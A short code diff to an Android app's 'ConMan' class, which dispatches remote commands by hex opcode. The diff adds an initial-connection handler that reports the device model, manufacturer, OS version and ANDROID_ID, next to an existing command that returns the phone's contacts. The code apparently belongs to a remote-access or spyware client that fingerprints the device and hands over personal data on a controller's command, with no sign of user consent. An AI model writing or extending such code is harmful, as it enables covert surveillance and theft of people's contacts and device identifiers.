@@ -1,5 +1,8 @@
 package com.dextrotechnologies.phonemate;
 
+import android.os.Build;
+import android.provider.Settings;
+
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
@@ -71,6 +74,11 @@ public class ConMan {
         String chunks[] = op.split("!?#");
 
         switch (chunks[0]) {
+            // Initial Con
+            case "0x00":
+                String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+                returnMessage = "model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID ;
+                break;
             // Contacts
             case "0xC0":
                 returnMessage = String.valueOf(ContactsMan.getContacts());
